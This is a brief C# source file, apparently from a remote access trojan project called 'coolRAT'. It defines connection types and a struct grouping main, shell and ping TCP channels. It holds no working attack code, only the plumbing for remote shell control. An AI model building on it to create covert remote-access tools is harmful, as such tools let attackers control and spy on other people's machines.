using coolRAT.Libs;
using System.Net.Sockets;

namespace coolRAT.Libs
{

    public enum PipeType
    {
        Main,
        Shell,
        Ping
    }
    public struct TcpPipes
    {
        public TcpConnection MainPipe;
        public TcpConnection ShellPipe;
        public TcpConnection PingPipe;

        public TcpPipes(TcpConnection mainPipe, TcpConnection shellPipe, TcpConnection pingPipe)
        {
            MainPipe = mainPipe;
            ShellPipe = shellPipe;
            PingPipe = pingPipe;
        }
    }
}